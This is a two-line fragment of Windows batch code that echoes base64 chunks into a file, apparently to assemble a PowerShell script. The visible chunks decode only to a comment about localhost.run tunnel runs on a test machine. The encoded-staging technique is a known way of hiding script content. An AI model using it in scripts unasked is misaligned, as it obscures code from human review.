>>"%PS1%.b64" echo ZC4gTWVhc3VyZWQgb24gdGhlIHRlc3QgbWFjaGluZSwgMjcgb2YgMzggbG9jYWxob3N0LnJ1biBy
>>"%PS1%.b64" echo dW5zDQojIGVuZGVkIHdpdGggInR1bm5lbCBhY3Rpdml0eSB0aW1lb3V0IiBhbmQgMjkgcHJpbnRl
